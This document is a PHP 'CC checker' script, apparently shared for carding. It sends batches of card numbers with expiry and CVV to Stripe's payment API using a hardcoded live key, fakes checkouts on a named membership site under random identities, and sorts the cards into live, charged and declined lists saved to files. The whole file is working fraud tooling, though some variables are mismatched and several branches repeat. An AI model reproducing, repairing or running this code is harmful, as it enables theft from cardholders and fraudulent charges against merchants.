<?php

/// ==== PHP SETUP BEGIN! ==== \\\
/// ==== Coded by: @frank_xx ==== \\\

error_reporting(1);
date_default_timezone_set('Asia/Jakarta');

if (strlen($mes) == 1) $mes = "0$mon";
if (strlen($ano) == 2) $ano = "20$year";
if (!file_exists('Temp')) mkdir('Temp', 0777, true);
$save_cookies = tempnam('Temp', 'ZCZ');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

//////====== END OF PHP SETUP! ======\\\\\\

/// === Capture Functions === \\\

function Capture($str, $starting_word, $ending_word){
    $subtring_start = strpos($str, $starting_word);
    $subtring_start += strlen($starting_word);
    $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
    return trim(preg_replace('/\s\s+/', '', strip_tags(substr($str, $subtring_start, $size))));
};

function Capture2($str, $starting_word, $ending_word){
    $subtring_start = strpos($str, $starting_word);
    $subtring_start += strlen($starting_word);
    $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
    return trim(preg_replace('/\s\s+/', "", strip_tags(substr($str, $subtring_start, $size))));
};

/// === ^^^ Capture Functions ^^^ === \\\

/// === CC Setup for whole API and Index! === \\\

$separa = explode("|", $lista);
$card = $separa[0];
$month = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

/// Keep in mind all of these variables... ^ ^ ^

////// ====== END OF CC WHOLE API SETUP! ====== \\\\\\

/// RANDOM NAME ARRAY 
$names = array();
$names[] = 'Olivia';
$names[] = 'Sophie';
$names[] = 'Carwyn';
$names[] = 'Nabilah';
$names[] = 'Madelaine';
$names[] = 'Hattie';
$names[] = 'Chloe';
$names[] = 'Alishia';
$names[] = 'Lea';
$names[] = 'Gillian';

if (isset($names) !==false) {
    $firstname = $names[array_rand($names)];
}

/// RANDOM LAST NAME ARRAY 
$lastnames = array();
$lastnames[] = 'dalton';
$lastnames[] = 'Smith';
$lastnames[] = 'Johnson';
$lastnames[] = 'Biffle ';
$lastnames[] = 'Baltimore';
$lastnames[] = 'wisdom';
$lastnames[] = 'Garcia';
$lastnames[] = 'Miller';
$lastnames[] = 'Brown';
$lastnames[] = 'Williams';
$lastnames[] = 'Davis';
    
if (isset($lastnames) !==false) {
    $lastname = $lastnames[array_rand($lastnames)]; 
}

$squaredick = str_shuffle('ahfeifjdjgirfg14596060557887');
$getstrnum = str_shuffle('7508125');

function startsWith ($string, $startString)
{
    $len = strlen($startString);
    return (substr($string, 0, $len) === $startString);
}

if(startsWith($year,"2022"))
    $ano1 = "22";
else if(startsWith($year,"2023"))
    $ano1 = "23";
else if(startsWith($year,"2024"))
    $ano1 = "24";
else if(startsWith($year,"2025"))
    $ano1 = "25";
else if(startsWith($year,"2026"))
    $ano1 = "26";
else if(startsWith($year,"2027"))
    $ano1 = "27";
else if(startsWith($year,"2028"))
    $ano1 = "28";
else if(startsWith($year,"2029"))
    $ano1 = "29";
else if(startsWith($year,"2030"))
    $ano1 = "30";
else if(startsWith($year,"2031"))
    $ano1 = "31";

if(startsWith($month,"01"))
    $ano2 = "1";
else if(startsWith($month,"02"))
    $ano2 = "2";
else if(startsWith($month,"03"))
    $ano2 = "3";
else if(startsWith($month,"04"))
    $ano2 = "4";
else if(startsWith($month,"05"))
    $ano2 = "5";
else if(startsWith($month,"06"))
    $ano2 = "6";
else if(startsWith($month,"07"))
    $ano2 = "7";
else if(startsWith($month,"08"))
    $ano2 = "8";
else if(startsWith($month,"09"))
    $ano2 = "9";
else if(startsWith($month,"10"))
    $ano2 = "10";
else if(startsWith($month,"11"))
    $ano2 = "11";
else if(startsWith($month,"12"))
    $ano2 = "12";
/// ==== [ Randomizing Details Api -- 2.o ] ==== \\\

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
preg_match_all("(\"username\":(.*),\")siU", $get, $matches1);
$username = $matches1[1][0];
preg_match_all("(\"password\":(.*),\")siU", $get, $matches1);
$password = $matches1[1][0];

/// ==== [ Randomizing Details Api -- END! ] ==== \\\

/// ==== 1st CURL Request ==== \\\

$cc1 = substr($card, 0,4);
$cc2 = substr($card, 4,4);
$cc3 = substr($card, 8,4);
$cc4 = substr($card, 12,4);

// qqwc-uuup-cnbt-jltk-krho

$lastfour = substr($cc, -4);

if(startsWith($card,"4"))
    $brand = "Visa";
else if(startsWith($card,"5"))
    $brand = "MasterCard";
else if(startsWith($card,"3"))
    $brand = "American+Express";
else if(startsWith($card,"6"))
    $brand = "Discover";

$curl = curl_init();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /v1/payment_methods';
$headers[] = 'Host: api.stripe.com';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Brave";v="109", "Chromium";v="109"';
$headers[] = 'Accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Accept-Language: en-US,en;q=0.8';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://js.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F9db428e73%3B+stripe-js-v3%2F9db428e73&time_on_page=398565&key=pk_live_GjBRdsM6VbXo2zWhLmR6fSpk00a580WO2c');
$curl = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://scalemyhustle.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'POST /membership-account/membership-checkout';
$headers[] = 'Host: scalemyhustle.com';
$headers[] = 'Cache-Control: max-age=0';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Brave";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Origin: https://scalemyhustle.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.8';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Referer: https://scalemyhustle.com/membership-account/membership-checkout/';
$headers[] = 'Cookie: PHPSESSID=ec1b26248cf9f589b5f654e166ec95da; pmpro_visit=1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&username='.$name.'&bemail='.$email.'%40hotmail.com&bconfirmemail_copy=1&password='.$password.'&password2='.$password.'&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX2133&ExpirationMonth=02&ExpirationYear=2025');
$curl = curl_exec($ch);
unlink($save_cookies);
$getmsg1 = Capture($paymentmethods2, '"message":"','","');

echo $paymentmethods1;
echo $paymentmethods2;

/////////////////////////////////////////////////

if(strpos($getmsg1,"security code") !==false){
       fwrite(fopen('ccn.txt', 'a'), $lista."\r\n"); 
    echo '#LIVE</span> <br>CC:  '.$lista.'</span> <br> ➤ Result: Live CCN | Incorrect CVC</span><br>';
}
elseif(strpos($getmsg1,"insufficient") !==false){
   fwrite(fopen('insufficient.txt', 'a'), $lista."\r\n"); 
    echo '#LIVE</span> <br>CC:  '.$lista.'</span> <br> ➤ Result: Live CVV | Insufficient Funds</span><br>';
}
elseif(strpos($getmsg1,"Your card has insufficient funds.") !==false){
   fwrite(fopen('insufficient.txt', 'a'), $lista."\r\n"); 
    echo '#LIVE</span> <br>CC:  '.$lista.'</span> <br> ➤ Result: Live CVV | Insufficient Funds</span><br>';
}
elseif(strpos($getmsg1,"insufficient funds") !==false){
   fwrite(fopen('insufficient.txt', 'a'), $lista."\r\n"); 
    echo '#LIVE</span>CC:  '.$lista.'<br> ➤ Result: Live CVV | Insufficient Funds</span><br>';
}
elseif(strpos($paymentmethods2, "Payment complete.") !==false) {
   fwrite(fopen('charged.txt', 'a'), $lista."\r\n"); 
echo '#CHARGED</span>  </span>CC:  '.$lista.'</span> <br> ➤ Response: Charged $49.00</span> <br> ✅ Checker By @SkilledFetcher10 <br>';
}
elseif(strpos($paymentmethods2, "Payment complete") !==false) {
   fwrite(fopen('charged.txt', 'a'), $lista."\r\n"); 
echo '#CHARGED</span>  </span>CC:  '.$lista.'</span> <br> ➤ Response: Charged $49.00</span> <br> ✅ Checker By @SkilledFetcher10 <br>';
}
elseif (strpos($getmsg1, "account") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Account Error</span><br>';
}
elseif (strpos($getmsg1, "auth") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Authentication Error</span><br>';
}
elseif (strpos($getmsg1, "authentication") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Authentication Error</span><br>';
}
elseif (strpos($getmsg1, "rate") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Rate Error</span><br>';
}
elseif (strpos($getmsg1, "exceed") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Exceed Error</span><br>';
}
elseif (strpos($getmsg1, "decline") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Declined</span><br>';
}
elseif (strpos($getmsg1, "support") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Supported Error</span><br>';
}
elseif (strpos($getmsg1, "supported") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Supported Error</span><br>';
}
elseif (strpos($getmsg1, "expire") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Expiry Error</span><br>';
}
elseif (strpos($getmsg1, "Your card was declined.") !==false){
    echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: card declined</span><br>';
    }
elseif (strpos($getmsg1, "incorrect") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Incorrect Error</span><br>';
}
elseif (strpos($getmsg1, "number") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Number Error</span><br>';
}
elseif (strpos($getmsg1, "zip") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Zip Code Error</span><br>';
}
elseif (strpos($getmsg1, "authentication") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Authentication Error</span><br>';
}
elseif (strpos($getmsg1, "invalid") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Invalid Card Error</span><br>';
}
elseif (strpos($getmsg1, "month") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Month Error</span><br>';
}
elseif (strpos($getmsg1, "year") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Year Error</span><br>';
}
elseif (strpos($getmsg1, "not") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Purchase Not Allowed Error</span><br>';
}
elseif (strpos($getmsg1, "allow") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Disallowed Error</span><br>';
}
elseif (strpos($getmsg1, "allowed") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Disallowed Error</span><br>';
}
elseif (strpos($getmsg1, "account") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Account Error</span><br>';
}
elseif (strpos($getmsg1, "auth") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Authentication Error</span><br>';
}
elseif (strpos($getmsg1, "authentication") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Authentication Error</span><br>';
}
elseif (strpos($getmsg1, "rate") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Rate Error</span><br>';
}
elseif (strpos($getmsg1, "exceed") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Exceed Error</span><br>';
}
elseif (strpos($getmsg1, "decline") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Declined</span><br>';
}
elseif (strpos($getmsg1, "support") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Supported Error</span><br>';
}
elseif (strpos($getmsg1, "supported") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Supported Error</span><br>';
}
elseif (strpos($getmsg1, "expire") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Expiry Error</span><br>';
}
elseif (strpos($getmsg1, "incorrect") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Incorrect Error</span><br>';
}
elseif (strpos($getmsg1, "number") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Number Error</span><br>';
}
elseif (strpos($getmsg1, "zip") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Zip Code Error</span><br>';
}
elseif (strpos($getmsg1, "authentication") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Authentication Error</span><br>';
}
elseif (strpos($getmsg1, "invalid") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Invalid Card Error</span><br>';
}
elseif (strpos($getmsg1, "month") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Month Error</span><br>';
}
elseif (strpos($getmsg1, "year") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Year Error</span><br>';
}
elseif (strpos($getmsg1, "not") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Purchase Not Allowed Error</span><br>';
}
elseif (strpos($getmsg1, "allow") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Disallowed Error</span><br>';
}
elseif (strpos($getmsg1, "allowed") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Disallowed Error</span><br>';
}
elseif (strpos($getmsg1, "request") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Request Error</span><br>';
}
elseif (strpos($getmsg1, "requires_payment_method") !==false){
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Declined Error</span><br>';
} else {
echo '#DIE</span> <br>CC:  '.$lista.'</span> <br> Result: Card Declined</span><br>';
}

//curl_close($ch);
//ob_flush();

?>